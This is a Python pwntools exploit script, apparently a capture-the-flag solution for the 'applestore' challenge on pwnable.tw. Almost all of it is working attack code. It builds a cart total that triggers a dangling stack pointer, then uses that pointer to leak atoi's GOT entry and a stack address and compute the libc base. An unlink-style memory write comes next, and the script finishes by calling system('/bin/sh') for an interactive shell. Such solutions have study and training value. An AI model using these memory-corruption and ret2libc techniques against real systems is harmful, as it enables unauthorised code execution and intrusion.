from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./applestore')
	atoi_offset = 0x002d250
	system_offset = 0x003ada0 
	binsh_offset = 0x15ba0b 
else:
	host, port = "chall.pwnable.tw", 10104
	r = remote(host, port)
	libc = ELF('./libc_32.so.6')
	atoi_offset = libc.symbols['atoi']
	system_offset = libc.symbols['system']
	binsh_offset = next(libc.search('/bin/sh'))
	
raw_input('debug')

def add(number):
	r.sendafter("> ", "2\n")
	r.sendafter("Device Number> ", str(number) + "\n")

def delete(number):
	r.sendafter("> ", "3\n")
	r.sendafter("Item Number> ", number + "\n")
	
def checkout():
	r.sendafter("> ", "5\n")
	r.sendafter("Let me check your cart. ok? (y/n) > ", "y\n")

def cart(choise):
	r.sendafter("> ", "4\n")
	r.sendafter("Let me check your cart. ok? (y/n) > ", choise)


kt = 0
count = 0
i = 0
j = 0
k = 0
t = 0
for i in range(int(7174/499)):
	for j in range(int(7174/399)):
		for k in range(int(7174/299)):
			for t in range(int(7174/199)):
				count = i*499 + j* 399 + k*299 + t*199
				if count == 7174:
					kt = 1
					break
			if kt == 1: 
				break
		if kt == 1:
			break
	if kt == 1:
		break

if i != 0:
	for n in range(i):
		add(3)
if j != 0:
	for n in range(j):
		add(4)
if k != 0:
	for n in range(k):
		add(2)
if t != 0:
	for n in range(t):
		add(1)

checkout()
atoi_got = 0x804b040
mycart_add = 0x0804B068

for i in range(26):
	delete('1')
	
print "cart"
payload = 'y\x00' + p32(atoi_got) + "aaaa" + p32(mycart_add + 0x8) 
cart(payload)
r.recvuntil("1: ")
leak = r.recv(4)
atoi_add = u32(leak)

libc_base = atoi_add - atoi_offset
system_add = libc_base + system_offset
binsh_add = libc_base + binsh_offset
log.info("atoi address = %#x" %atoi_add)
log.info('libc base = %#x ' %libc_base )


payload = '1'
payload = payload.ljust(10, '\x00')
payload += p32(mycart_add + 0x8)
payload += p32(mycart_add + 0x8)
delete(payload)

payload = 'y\x00' + p32(atoi_got) + "aaaa" + p32(mycart_add + 0x10)
cart(payload)

r.recvuntil("2: ")
leak = r.recv(4)
stack = u32(leak)
log.info("stack = %#x" %stack)

payload = '1'
payload = payload.ljust(10, '\x00') 
payload += p32(stack + 0x3c) + p32(stack + 0x58)
delete(payload)

payload = '6\x00' + p32(system_add) + p32(binsh_add) + p32(binsh_add)
r.sendafter("> ", payload)

r.interactive()
r.close()
